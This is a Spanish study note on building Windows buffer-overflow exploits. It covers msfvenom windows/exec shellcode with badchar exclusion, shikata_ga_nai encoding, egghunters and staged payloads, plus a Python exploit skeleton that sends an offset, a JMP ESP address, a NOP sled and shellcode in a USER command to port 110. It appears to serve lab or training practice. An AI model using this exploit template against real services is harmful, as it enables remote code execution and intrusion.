
---
Tags: #shellcode #ESP #badcharts #buffer #bufferoverflow #mona #inmunityDebuger #msfvenom 

---
# Qué hace `windows/exec` (1 línea)

Genera shellcode que ejecuta un comando arbitrario especificado en la variable `CMD`. Es _single-stage_: ejecuta el comando localmente en la máquina víctima.

---

# Comando msfvenom básico (Windows x86)

`msfvenom -p windows/exec CMD="calc.exe" -b "\x00\x0a\x0d" -f python`

- `-p windows/exec` payload.
    
- `CMD="..."` comando a ejecutar.
    
- `-b` lista badchars a excluir.
    
- `-f python` genera array listo para pegar en script Python.
    
- Opcional: `-a x86 --platform windows` si quieres forzar arquitectura/plataforma.
    

Ejemplo con comando más complejo (escapar comillas en shell):

`msfvenom -p windows/exec CMD="c:\\\\windows\\\\system32\\\\cmd.exe /c dir C:\\ > C:\\\\temp\\\\out.txt" -f python -b "\x00"`

---

# Encoders y evasión de badchars

- Añadir `-e x86/shikata_ga_nai -i 3` para re-encodar.
    
- Encoders pueden evitar algunos badchars pero:
    
    - aumentan tamaño del payload.
        
    - pueden activar AV/IDS.
        
- Siempre verificar bytes resultantes contra la lista de badchars.
    

---

# Límites prácticos y alternativas

- **Tamaño**: `windows/exec` puede ser grande. Si no cabe en buffer, usa:
    
    - _egghunter_ (pequeño stub que busca el shellcode grande en memoria).
        
    - _staged_ payloads (Meterpreter reverse_tcp staged) para conectar y cargar el segundo stage.
        
- **Permisos/AV**: ejecutar comandos puede ser detectado.
    
- **Badchars**: msfvenom `-b` + encoders.
    
- **ASLR/DEP**: si NX/DEP activo, necesitas ROP/mprotect o usar gadgets en módulos sin NX.
    

---

# Integración en exploit Python (ejemplo mínimo)

Pega aquí el array que msfvenom imprime en `-f python` como `shellcode`:

`import struct, socket, time  IP="192.168.1.145"; PORT=110 offset = 260 jmp_esp = 0x625011AF   # dirección JMP ESP válida y sin badchars # shellcode generado por msfvenom -f python (por ejemplo variable 'buf') shellcode =  b"\\xdb\\xc6..."   # pegar salida msfvenom  # Comprobar badchars en shellcode (rápido) bad = b"\x00\x0a\x0d" if any(b in shellcode for b in bad):     raise SystemExit("Shellcode contiene badchars: re-genera con -b")  payload = b"A"*offset payload += struct.pack("<I", jmp_esp) payload += b"\x90"*32            # NOP-sled payload += shellcode  s = socket.create_connection((IP,PORT), timeout=3) _ = s.recv(1024) s.sendall(b"USER " + payload + b"\r\n") time.sleep(0.2) s.close()`

---

# Uso de egghunter si el shellcode no cabe

- Genera shellcode grande con msfvenom y cópialo en una región accesible (env, heap, múltiples conexiones).
    
- Inserta un _egghunter_ pequeño (p. ej. 32 bytes) en la zona donde controlas EIP.
    
- Egghunter busca el _egg_ (marcador de 4 bytes) y salta al shellcode real.
    
- msfpayloads / PayloadsAllTheThings tienen egghunters listos.
    

---

# Buenas prácticas antes de ejecutar

- Verifica longitud del shellcode. `len(shellcode)` en Python.
    
- Verifica bytes empacados de la dirección `struct.pack("<I", addr)` no contienen badchars.
    
- Prueba primero en VM/entorno aislado.
    
- Registrar payloads que causen crash.
    

---

# Ejemplo de msfvenom para Python + exclusión de badchars + encoder

`msfvenom -p windows/exec CMD="calc.exe" -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 3 -f python`